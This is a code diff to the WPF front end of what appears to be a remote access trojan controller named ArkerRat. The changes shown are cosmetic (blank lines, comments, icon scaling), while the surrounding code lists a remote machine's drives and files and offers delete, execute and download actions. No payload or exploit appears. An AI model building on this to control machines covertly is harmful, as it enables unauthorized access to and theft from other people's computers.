@@ -75,7 +75,6 @@ namespace ArkerRatWpfVersion
                 customBorder.Height = customBorder.Height * 2;
                 customBorder.Width = customBorder.Width * 2;
 
-
                 zoom = false;
             }
             else
@@ -105,13 +104,10 @@ namespace ArkerRatWpfVersion
                     data = data.Replace("§drives§", string.Empty);
                     string[] disks = data.Trim(',').Split(',');
                     foreach (string s in disks)
-                    {
-                        
-
+                    {                    
                         Button disk = new Button();
                         disk.Background = Brushes.Transparent;
                         disk.VerticalContentAlignment = VerticalAlignment.Bottom;
-
 
                         Brush buttonBrush = new SolidColorBrush((Color)ColorConverter.ConvertFromString("#FF9966FF"));
                         disk.Foreground = buttonBrush;
@@ -122,15 +118,12 @@ namespace ArkerRatWpfVersion
                         disk.Tag = s;
                         disk.Content = s;
 
-                        // Create the image brush
                         ImageBrush imageBrush = new ImageBrush();
-                        imageBrush.ImageSource = TryFindResource("DriveImage") as BitmapImage; // Replace with your image path
-                        // Set the background of the button to the image brush
+                        imageBrush.ImageSource = TryFindResource("DriveImage") as BitmapImage; 
                         disk.Background = imageBrush;
 
                         disk.Click += new RoutedEventHandler(PathObjectClickedOn);
                         fileManager.Items.Add(disk);
-
                     }
                     status.Content = "status";
                 }
@@ -153,10 +146,8 @@ namespace ArkerRatWpfVersion
                             folder.BorderBrush = null;
                             // Create the image brush
                             ImageBrush imageBrush = new ImageBrush();
-                            imageBrush.ImageSource = TryFindResource("FolderImage") as BitmapImage; // Replace with your image path
-                                                                                                    // Set the background of the button to the image brush
+                            imageBrush.ImageSource = TryFindResource("FolderImage") as BitmapImage; 
                             folder.Background = imageBrush;
-
 
                             Brush buttonBrush = new SolidColorBrush((Color)ColorConverter.ConvertFromString("#FF9966FF"));
 
@@ -170,7 +161,6 @@ namespace ArkerRatWpfVersion
                                 objectName = objectName.Substring(0, 7) + "...";
                             }
                             folder.Content = objectName;
-
 
                             folder.Click += new RoutedEventHandler(PathObjectClickedOn);
                             folder.MouseRightButtonDown += new MouseButtonEventHandler(OpenContextMenuFolder);
@@ -189,18 +179,15 @@ namespace ArkerRatWpfVersion
                             file.BorderBrush = null;
                             // Create the image brush
                             ImageBrush imageBrush = new ImageBrush();
-                            imageBrush.ImageSource = TryFindResource("FileImage") as BitmapImage; // Replace with your image path
-                                                                                                  // Set the background of the button to the image brush
+                            imageBrush.ImageSource = TryFindResource("FileImage") as BitmapImage;
                             file.Background = imageBrush;
 
                             Brush buttonBrush = new SolidColorBrush((Color)ColorConverter.ConvertFromString("#FF9966FF"));
                             file.Foreground = buttonBrush;
 
-
                             file.Tag = "§file§" + s;
                             file.Width = 100;
                             file.Height = 100;
-
 
                             string objectName = s.Substring(s.LastIndexOf("\\") + 1);
                             if (objectName.Length > 10)
@@ -209,11 +196,9 @@ namespace ArkerRatWpfVersion
                             }
                             file.Content = objectName;
 
-
                             file.MouseRightButtonDown += new MouseButtonEventHandler(OpenContextMenuFile);
                             fileManager.Items.Add(file);
-                        }
-                        
+                        }                     
                     }
                     status.Content = "status";
                 }
@@ -231,7 +216,6 @@ namespace ArkerRatWpfVersion
             {
                 selector= button.Tag.ToString().Replace("§file§",string.Empty);
             }
-           
         }
 
         private void OpenContextMenuFolder(object sender, MouseEventArgs e)
@@ -248,7 +232,7 @@ namespace ArkerRatWpfVersion
             delete.Click += DeleteObject;
             delete.Icon = new Image
             {
-                Stretch = Stretch.Fill,
+                Stretch = Stretch.Uniform,
                 Source = TryFindResource("RemoveImage") as BitmapImage
             };
             folder.ContextMenu.Items.Add(delete);
@@ -267,7 +251,7 @@ namespace ArkerRatWpfVersion
             delete.Click += DeleteObject;
             delete.Icon = new Image
             {
-                Stretch = Stretch.Fill,
+                Stretch = Stretch.Uniform,
                 Source = TryFindResource("RemoveImage") as BitmapImage
             };
 
@@ -276,7 +260,7 @@ namespace ArkerRatWpfVersion
             execute.Click += ExecuteFile;
             execute.Icon = new Image
             {
-                Stretch = Stretch.Fill,
+                Stretch = Stretch.Uniform,
                 Source = TryFindResource("FileImage") as BitmapImage
             };
 
@@ -285,7 +269,7 @@ namespace ArkerRatWpfVersion
             download.Click += DownloadFile;
             download.Icon = new Image
             {
-                Stretch = Stretch.Fill,
+                Stretch = Stretch.Uniform,
                 Source = TryFindResource("DownloadImage") as BitmapImage
             };
 
@@ -431,7 +415,6 @@ namespace ArkerRatWpfVersion
                 stream.Close();
             }
             download= false;
-
         }
 
         private async void Refresh(object sender, RoutedEventArgs e)
